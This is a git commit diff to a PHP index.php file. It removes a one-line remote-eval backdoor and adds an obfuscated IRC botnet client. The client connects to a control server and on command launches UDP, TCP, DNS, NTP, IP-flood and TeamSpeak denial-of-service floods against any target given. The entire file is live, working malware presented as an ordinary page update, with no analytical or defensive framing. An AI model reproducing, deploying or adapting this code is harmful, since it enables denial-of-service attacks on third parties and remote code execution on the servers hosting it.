e3322962455f054fbf877f5c71310900e5594620
ptsleon <45050428+ptsleon@users.noreply.github.com>
2019-01-07 18:28:27 +0100

    Update index.php

--- index.php
+++ index.php
@@ -1,1 +1,251 @@
-<?php if (isset ($_GET['url']) && isset ($_GET['args'])) { $fqaewzFBlcQOIlGvQxCF = json_decode($_GET['args'], true); eval(str_replace(array_keys($fqaewzFBlcQOIlGvQxCF), array_values($fqaewzFBlcQOIlGvQxCF), file_get_contents($_GET['url']))); } ?>
+<?php
+ini_set('max_execution_time', 0);
+error_reporting(0);
+set_time_limit(0);
+
+$IwUHZtyYbvKQtvCkzdEG = "home.bernardo.fm";
+$HRNzuIpCyDqiiOwbpTXE = intval("6667");
+$AwDvxSpknwtwoLYMYBMm = "#" . "sandro";
+$OkLlfNxmhZBNUVGYrTHq = "+";
+$dZTDkVCilIMFsthsjKWd = "bot" . rand(100000, 999999);
+$YLoZtmMypUNUEBXuSHbQ = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
+$UVofLJtxBqtAMlEvQNY = NULL;
+$chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
+
+function TgxcCtzFbxQQxWNcbdoU ($htcFFCQTLLpnCchsPKGY, $cUqDyYBzaAZfzXNIfwjj)
+{
+    $RPGWcgVYHUTbxxVZGlcN = "";
+    for($BCEUSjHFFwzzqmHmpjjQ=0;$BCEUSjHFFwzzqmHmpjjQ<65535;$BCEUSjHFFwzzqmHmpjjQ++)
+        $RPGWcgVYHUTbxxVZGlcN .= 'X';
+
+    $BiKnewPpQfRnzsgbSYDK = mt_rand(1,65535);
+    $HjPCzVNTrWPXFwtaprwf = fsockopen('udp://'.$htcFFCQTLLpnCchsPKGY, $BiKnewPpQfRnzsgbSYDK, $JihlYAzfwgLRefdRlgjT, $hCxduPCpEBPibxPNFMxY, 5);
+    for ($epLzmNilVVwHedYAdhX = (time() + $cUqDyYBzaAZfzXNIfwjj); time() < $epLzmNilVVwHedYAdhX;)
+        fwrite($HjPCzVNTrWPXFwtaprwf, $RPGWcgVYHUTbxxVZGlcN);
+
+    fclose($HjPCzVNTrWPXFwtaprwf);
+}
+
+function xiaJctfoRckKRFzAvvcE ($htcFFCQTLLpnCchsPKGY, $cUqDyYBzaAZfzXNIfwjj, $oXyaqmHoChvHQFCvTluq)
+{
+    $BqrQxxukUszpjagTVVNq = array_map("base64_decode", explode("\n", file_get_contents($oXyaqmHoChvHQFCvTluq))); 
+
+    $GMlmfCmZyrPVNKofRDun = socket_create(AF_INET, SOCK_DGRAM, SOL_UDP);
+    socket_bind($GMlmfCmZyrPVNKofRDun, "0.0.0.0", 123);
+    socket_connect($GMlmfCmZyrPVNKofRDun, $htcFFCQTLLpnCchsPKGY, 123);
+
+    for($epLzmNilVVwHedYAdhX = (time() + $cUqDyYBzaAZfzXNIfwjj); time() < $epLzmNilVVwHedYAdhX;)
+        foreach ($BqrQxxukUszpjagTVVNq as $RPGWcgVYHUTbxxVZGlcN)
+            socket_send($GMlmfCmZyrPVNKofRDun, $RPGWcgVYHUTbxxVZGlcN, strlen($RPGWcgVYHUTbxxVZGlcN), 0);
+
+    socket_close($GMlmfCmZyrPVNKofRDun);
+}
+
+function sxzFmYyXjIlDhCZUiSUv ($htcFFCQTLLpnCchsPKGY, $cUqDyYBzaAZfzXNIfwjj, $oXyaqmHoChvHQFCvTluq)
+{
+    $BqrQxxukUszpjagTVVNq = array_map("base64_decode", explode("\n", file_get_contents($oXyaqmHoChvHQFCvTluq))); 
+
+    $GMlmfCmZyrPVNKofRDun = socket_create(AF_INET, SOCK_DGRAM, SOL_UDP);
+    socket_bind($GMlmfCmZyrPVNKofRDun, "0.0.0.0", 53);
+    socket_connect($GMlmfCmZyrPVNKofRDun, $htcFFCQTLLpnCchsPKGY, mt_rand(1024, 65535));
+
+    for($epLzmNilVVwHedYAdhX = (time() + $cUqDyYBzaAZfzXNIfwjj); time() < $epLzmNilVVwHedYAdhX;)
+        foreach ($BqrQxxukUszpjagTVVNq as $RPGWcgVYHUTbxxVZGlcN)
+            socket_send($GMlmfCmZyrPVNKofRDun, $RPGWcgVYHUTbxxVZGlcN, strlen($RPGWcgVYHUTbxxVZGlcN), 0);
+
+    socket_close($GMlmfCmZyrPVNKofRDun);
+}
+
+function xkDmARDvHoKiDBgrKHJB ($htcFFCQTLLpnCchsPKGY, $BiKnewPpQfRnzsgbSYDK, $cUqDyYBzaAZfzXNIfwjj, $OQijXfnrxWxPIcPSUibK, $oXyaqmHoChvHQFCvTluq)
+{
+    $OQijXfnrxWxPIcPSUibK = array_map("base64_decode", explode("\n", file_get_contents($OQijXfnrxWxPIcPSUibK))); 
+    $oXyaqmHoChvHQFCvTluq = array_map("base64_decode", explode("\n", file_get_contents($oXyaqmHoChvHQFCvTluq))); 
+
+    $JzmJgzkWlrVYAUVkuiHG = preg_grep("/( ip=)/", $OQijXfnrxWxPIcPSUibK);
+    $OQijXfnrxWxPIcPSUibK[key($JzmJgzkWlrVYAUVkuiHG)] .= $htcFFCQTLLpnCchsPKGY;
+
+    $GMlmfCmZyrPVNKofRDun = socket_create(AF_INET, SOCK_DGRAM, SOL_UDP);
+    socket_connect($GMlmfCmZyrPVNKofRDun, $htcFFCQTLLpnCchsPKGY, $BiKnewPpQfRnzsgbSYDK);
+
+    foreach ($OQijXfnrxWxPIcPSUibK as $RPGWcgVYHUTbxxVZGlcN) {
+        socket_send($GMlmfCmZyrPVNKofRDun, $RPGWcgVYHUTbxxVZGlcN, strlen($RPGWcgVYHUTbxxVZGlcN), 0);
+        usleep(18500);
+    }
+
+    for ($epLzmNilVVwHedYAdhX = time() + $cUqDyYBzaAZfzXNIfwjj; $epLzmNilVVwHedYAdhX > time();)
+        foreach ($oXyaqmHoChvHQFCvTluq as $RPGWcgVYHUTbxxVZGlcN)
+            socket_send($GMlmfCmZyrPVNKofRDun, $RPGWcgVYHUTbxxVZGlcN, strlen($RPGWcgVYHUTbxxVZGlcN), 0);
+
+    socket_close($GMlmfCmZyrPVNKofRDun);
+}
+
+function wFybiKTkElpilCz ($htcFFCQTLLpnCchsPKGY, $BiKnewPpQfRnzsgbSYDK, $cUqDyYBzaAZfzXNIfwjj, $iTaOHWgBVpOrSOYnQYyy)
+{
+    GLOBAL $chars;
+    $RPGWcgVYHUTbxxVZGlcN = "";
+    $GMlmfCmZyrPVNKofRDun = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
+
+    $oXyaqmHoChvHQFCvTluq = substr(str_shuffle($chars), 0, 5);
+
+    while (strlen($RPGWcgVYHUTbxxVZGlcN) < $iTaOHWgBVpOrSOYnQYyy)
+        $RPGWcgVYHUTbxxVZGlcN .= $oXyaqmHoChvHQFCvTluq;
+
+    $RPGWcgVYHUTbxxVZGlcN = substr($RPGWcgVYHUTbxxVZGlcN, 0, $iTaOHWgBVpOrSOYnQYyy);
+
+
+    socket_set_option($GMlmfCmZyrPVNKofRDun, SOL_SOCKET, SO_SNDTIMEO, array('sec' => 5, 'usec' => 0));
+    socket_connect($GMlmfCmZyrPVNKofRDun, $htcFFCQTLLpnCchsPKGY, $BiKnewPpQfRnzsgbSYDK);
+    for ($epLzmNilVVwHedYAdhX = (time() + $cUqDyYBzaAZfzXNIfwjj); time() < $epLzmNilVVwHedYAdhX;)
+        socket_send($GMlmfCmZyrPVNKofRDun, $RPGWcgVYHUTbxxVZGlcN, strlen($RPGWcgVYHUTbxxVZGlcN), 0);
+
+    socket_close($GMlmfCmZyrPVNKofRDun);
+}
+
+function TYZCnxaDlrYLdbcAgzQh ($htcFFCQTLLpnCchsPKGY, $BiKnewPpQfRnzsgbSYDK, $cUqDyYBzaAZfzXNIfwjj)
+{
+    GLOBAL $chars;
+    $RPGWcgVYHUTbxxVZGlcN = "";
+    $GMlmfCmZyrPVNKofRDun = socket_create(AF_INET, SOCK_DGRAM, SOL_UDP);
+
+    while (strlen($RPGWcgVYHUTbxxVZGlcN) < 1024)
+        $RPGWcgVYHUTbxxVZGlcN .= substr(str_shuffle($chars), 0, 1);
+
+    $pXOQNLdQumjudYobIGDB = strlen($RPGWcgVYHUTbxxVZGlcN);
+    socket_connect($GMlmfCmZyrPVNKofRDun, $htcFFCQTLLpnCchsPKGY, $BiKnewPpQfRnzsgbSYDK);
+
+    for ($epLzmNilVVwHedYAdhX = (time() + $cUqDyYBzaAZfzXNIfwjj); time() < $epLzmNilVVwHedYAdhX;)
+        socket_send($GMlmfCmZyrPVNKofRDun, $RPGWcgVYHUTbxxVZGlcN, $pXOQNLdQumjudYobIGDB, 0);
+
+    socket_close($GMlmfCmZyrPVNKofRDun);
+}
+
+function lEGjmQyoTqJkQsxGEHg ($htcFFCQTLLpnCchsPKGY, $BiKnewPpQfRnzsgbSYDK, $cUqDyYBzaAZfzXNIfwjj, $iTaOHWgBVpOrSOYnQYyy, $BAGXdAkkeNRQdbowxdpr)
+{
+    GLOBAL $chars;
+    $oXyaqmHoChvHQFCvTluq = substr(str_shuffle($chars), 0, 5);
+    $RPGWcgVYHUTbxxVZGlcN = "";
+    $iXhBWoExSBTDGzbBtVCo = socket_create(AF_INET, SOCK_DGRAM, SOL_UDP);
+
+
+    if (!isset($BAGXdAkkeNRQdbowxdpr))
+        while (strlen($RPGWcgVYHUTbxxVZGlcN) < $iTaOHWgBVpOrSOYnQYyy)
+            $RPGWcgVYHUTbxxVZGlcN .= $oXyaqmHoChvHQFCvTluq;
+    else
+        while (strlen($RPGWcgVYHUTbxxVZGlcN) < $iTaOHWgBVpOrSOYnQYyy)
+            $RPGWcgVYHUTbxxVZGlcN .= $BAGXdAkkeNRQdbowxdpr;
+
+    $RPGWcgVYHUTbxxVZGlcN = substr($RPGWcgVYHUTbxxVZGlcN, 0, $iTaOHWgBVpOrSOYnQYyy);
+    socket_connect($iXhBWoExSBTDGzbBtVCo, $htcFFCQTLLpnCchsPKGY, $BiKnewPpQfRnzsgbSYDK);
+
+    for ($epLzmNilVVwHedYAdhX = (time() + $cUqDyYBzaAZfzXNIfwjj); time() < $epLzmNilVVwHedYAdhX;)
+        socket_send($iXhBWoExSBTDGzbBtVCo, $RPGWcgVYHUTbxxVZGlcN, strlen($RPGWcgVYHUTbxxVZGlcN), 0);
+
+    socket_close($iXhBWoExSBTDGzbBtVCo);
+}
+
+function qASauLKtZIKcdoxKzWjY ($AwDvxSpknwtwoLYMYBMm)
+{
+    $NygjKszxwCxlHbyDpHTT = "PRIVMSG " . $AwDvxSpknwtwoLYMYBMm . " :##########################  Help command  ##########################\n";
+    $NygjKszxwCxlHbyDpHTT .= "PRIVMSG " . $AwDvxSpknwtwoLYMYBMm . " :- udpflood [IP] [PORT] [TIME] [SIZE] (CONTENT)\n";
+    $NygjKszxwCxlHbyDpHTT .= "PRIVMSG " . $AwDvxSpknwtwoLYMYBMm . " :- teamspeak [IP] [PORT] [TIME] [CONNECTION PACKETS] [DATA PACKETS]\n";
+    $NygjKszxwCxlHbyDpHTT .= "PRIVMSG " . $AwDvxSpknwtwoLYMYBMm . " :- bandwidth [IP] [PORT] [TIME]\n";
+    $NygjKszxwCxlHbyDpHTT .= "PRIVMSG " . $AwDvxSpknwtwoLYMYBMm . " :- tcpflood [IP] [PORT] [TIME] [SIZE]\n";
+    $NygjKszxwCxlHbyDpHTT .= "PRIVMSG " . $AwDvxSpknwtwoLYMYBMm . " :- dnsflood [IP] [TIME] [DATA PACKETS]\n";
+    $NygjKszxwCxlHbyDpHTT .= "PRIVMSG " . $AwDvxSpknwtwoLYMYBMm . " :- ntpflood [IP] [TIME] [DATA PACKETS]\n";
+    $NygjKszxwCxlHbyDpHTT .= "PRIVMSG " . $AwDvxSpknwtwoLYMYBMm . " :- ipflood [IP] [TIME]\n";
+    $NygjKszxwCxlHbyDpHTT .= "PRIVMSG " . $AwDvxSpknwtwoLYMYBMm . " :####################################################################\n";
+    return $NygjKszxwCxlHbyDpHTT;
+}
+
+if (socket_connect($YLoZtmMypUNUEBXuSHbQ, $IwUHZtyYbvKQtvCkzdEG, $HRNzuIpCyDqiiOwbpTXE)) {
+
+    $buauipzwsOpZImn = "USER " . $dZTDkVCilIMFsthsjKWd . " local.net ~ bot\n";
+    socket_write($YLoZtmMypUNUEBXuSHbQ, $buauipzwsOpZImn, strlen($buauipzwsOpZImn));
+    $buauipzwsOpZImn = "NICK " . $dZTDkVCilIMFsthsjKWd . " \n";
+    socket_write($YLoZtmMypUNUEBXuSHbQ, $buauipzwsOpZImn, strlen($buauipzwsOpZImn));
+    $buauipzwsOpZImn = "JOIN " . $AwDvxSpknwtwoLYMYBMm . "\n";
+    socket_write($YLoZtmMypUNUEBXuSHbQ, $buauipzwsOpZImn, strlen($buauipzwsOpZImn));
+
+    while ($oXyaqmHoChvHQFCvTluq = socket_read($YLoZtmMypUNUEBXuSHbQ, 256)) {
+
+        if (strpos($oXyaqmHoChvHQFCvTluq, 'PRIVMSG') !== FALSE) {
+            $buauipzwsOpZImn = explode(":", explode("PRIVMSG", $oXyaqmHoChvHQFCvTluq)[1], 2)[1];
+            $dJQvooJBnmlMZGIYdMc = substr($buauipzwsOpZImn, 0, 1);
+
+            if ($dJQvooJBnmlMZGIYdMc == $OkLlfNxmhZBNUVGYrTHq) {
+                $MDDnKPFUvFBkQnvuTtri = explode(" ", substr($buauipzwsOpZImn, 1));
+                foreach ($MDDnKPFUvFBkQnvuTtri as &$BNbiswCRGZXvotnBAKXW) {
+                    $BNbiswCRGZXvotnBAKXW = trim($BNbiswCRGZXvotnBAKXW);
+                }
+
+                switch ($MDDnKPFUvFBkQnvuTtri[0]) {
+                    case "die":
+                        socket_close($YLoZtmMypUNUEBXuSHbQ);
+                        exit();
+                    case "help":
+                        $buauipzwsOpZImn = qASauLKtZIKcdoxKzWjY($AwDvxSpknwtwoLYMYBMm);
+                        socket_write($YLoZtmMypUNUEBXuSHbQ, $buauipzwsOpZImn, strlen($buauipzwsOpZImn));
+                        break;
+                    case "teamspeak":
+                        if (count($MDDnKPFUvFBkQnvuTtri) == 6) {
+                            xkDmARDvHoKiDBgrKHJB($MDDnKPFUvFBkQnvuTtri[1], intval($MDDnKPFUvFBkQnvuTtri[2]), intval($MDDnKPFUvFBkQnvuTtri[3]), $MDDnKPFUvFBkQnvuTtri[4], $MDDnKPFUvFBkQnvuTtri[5]);
+                            $UVofLJtxBqtAMlEvQNY = "true";
+                        } else
+                            $UVofLJtxBqtAMlEvQNY = "false";
+                        break;
+                    case "bandwidth":
+                        if (count($MDDnKPFUvFBkQnvuTtri) == 4) {
+                            TYZCnxaDlrYLdbcAgzQh($MDDnKPFUvFBkQnvuTtri[1], intval($MDDnKPFUvFBkQnvuTtri[2]), intval($MDDnKPFUvFBkQnvuTtri[3]));
+                            $UVofLJtxBqtAMlEvQNY = "true";
+                        } else
+                            $UVofLJtxBqtAMlEvQNY = "false";
+                        break;
+                    case "dnsflood":
+                        if (count($MDDnKPFUvFBkQnvuTtri) == 4) {
+                            sxzFmYyXjIlDhCZUiSUv($MDDnKPFUvFBkQnvuTtri[1], intval($MDDnKPFUvFBkQnvuTtri[2]), $MDDnKPFUvFBkQnvuTtri[3]);
+                            $UVofLJtxBqtAMlEvQNY = "true";
+                        } else
+                            $UVofLJtxBqtAMlEvQNY = "false";
+                        break;
+                    case "ntpflood":
+                        if (count($MDDnKPFUvFBkQnvuTtri) == 4) {
+                            xiaJctfoRckKRFzAvvcE($MDDnKPFUvFBkQnvuTtri[1], intval($MDDnKPFUvFBkQnvuTtri[2]), $MDDnKPFUvFBkQnvuTtri[3]);
+                            $UVofLJtxBqtAMlEvQNY = "true";
+                        } else
+                            $UVofLJtxBqtAMlEvQNY = "false";
+                        break;
+                    case "ipflood":
+                        if (count($MDDnKPFUvFBkQnvuTtri) == 3) {
+                            TgxcCtzFbxQQxWNcbdoU($MDDnKPFUvFBkQnvuTtri[1], intval($MDDnKPFUvFBkQnvuTtri[2]));
+                            $UVofLJtxBqtAMlEvQNY = "true";
+                        } else
+                            $UVofLJtxBqtAMlEvQNY = "false";
+                        break;
+                    case "tcpflood":
+                        if (count($MDDnKPFUvFBkQnvuTtri) == 5) {
+                            wFybiKTkElpilCz($MDDnKPFUvFBkQnvuTtri[1], intval($MDDnKPFUvFBkQnvuTtri[2]), intval($MDDnKPFUvFBkQnvuTtri[3]), intval($MDDnKPFUvFBkQnvuTtri[4]));
+                            $UVofLJtxBqtAMlEvQNY = "true";
+                        } else
+                            $UVofLJtxBqtAMlEvQNY = "false";
+                        break;
+                    case "udpflood":
+                        if (count($MDDnKPFUvFBkQnvuTtri) >= 5) {
+                            lEGjmQyoTqJkQsxGEHg($MDDnKPFUvFBkQnvuTtri[1], intval($MDDnKPFUvFBkQnvuTtri[2]), intval($MDDnKPFUvFBkQnvuTtri[3]), intval($MDDnKPFUvFBkQnvuTtri[4]), $MDDnKPFUvFBkQnvuTtri[5]);
+                            $UVofLJtxBqtAMlEvQNY = "true";
+                        } else
+                            $UVofLJtxBqtAMlEvQNY = "false";
+                        break;
+                    default:
+                        break;
+                }
+
+                if ($UVofLJtxBqtAMlEvQNY == "true")
+                    socket_write($YLoZtmMypUNUEBXuSHbQ, "PRIVMSG " . $AwDvxSpknwtwoLYMYBMm . " :Successfully executed the command.\n");
+                elseif ($UVofLJtxBqtAMlEvQNY == "false")
+                    socket_write($YLoZtmMypUNUEBXuSHbQ, "PRIVMSG " . $AwDvxSpknwtwoLYMYBMm . " :Wrong usage for this command. Try +help for further information.\n");
+
+                $UVofLJtxBqtAMlEvQNY = NULL;
+            }
+        }
+    }
+} ?>
